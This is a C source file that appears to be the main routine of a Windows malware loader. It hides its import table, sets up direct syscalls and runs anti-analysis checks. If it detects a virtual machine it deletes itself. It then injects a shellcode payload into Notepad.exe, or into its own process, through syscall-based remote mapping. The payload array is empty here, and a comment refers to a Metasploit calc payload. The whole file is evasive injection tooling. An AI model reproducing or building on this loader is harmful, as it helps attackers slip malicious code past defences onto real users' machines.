#include <Windows.h>
#include <stdio.h>
#include "Common.h"
#include "Debug.h"
#include "IatCamouflage.h"

// comment to inject to the local process
#define TARGET_PROCESS	L"Notepad.exe"// x64 calc metasploit

UCHAR Payload[] = { NULL };

INT main() {

	DWORD		dwProcessId = NULL;
	HANDLE		hProcess = NULL;

	IatCamouflage();

	if (!InitializeSyscalls()) {
#if DEBUG
		PRINTA("[!] Failed To Initialize Syscalls Structure \n");
#endif
		return -1;
	}
	
	if (!AntiAnalysis(20000)) {
#if DEBUG
		PRINTA("[!] Detected A Virtualized Environment \n");
#endif
		DeleteSelf();
		return -1;
	}
	
#ifdef TARGET_PROCESS
#if DEBUG
	PRINTW(L"[i] Targetting Remote Process %s ... \n", TARGET_PROCESS);
#endif
	if (!GetRemoteProcessHandle(TARGET_PROCESS, &dwProcessId, &hProcess)) {
#if DEBUG
		PRINTA("[!] Could Not Find Target Process Id \n");
#endif
		return -1;
	}
#if DEBUG
	PRINTA("[+] Target Process Id Detected Of PID : %d \n", dwProcessId);
#endif

	if (!RemoteMappingInjectionViaSyscalls(hProcess, Payload, sizeof(Payload), FALSE)) {
#if DEBUG
		PRINTA("[!] Failed To Inject Payload \n");
#endif
		return -1;
	}


#endif 
	// TARGET_PROCESS
#ifndef TARGET_PROCESS
	if (!RemoteMappingInjectionViaSyscalls((HANDLE)-1, Payload, sizeof(Payload), TRUE)) {
#if DEBUG
		PRINTA("[!] Failed To Inject Payload \n");
#endif
	return -1;
}

#endif 
	// !TARGET_POCESS
	return 0;
}
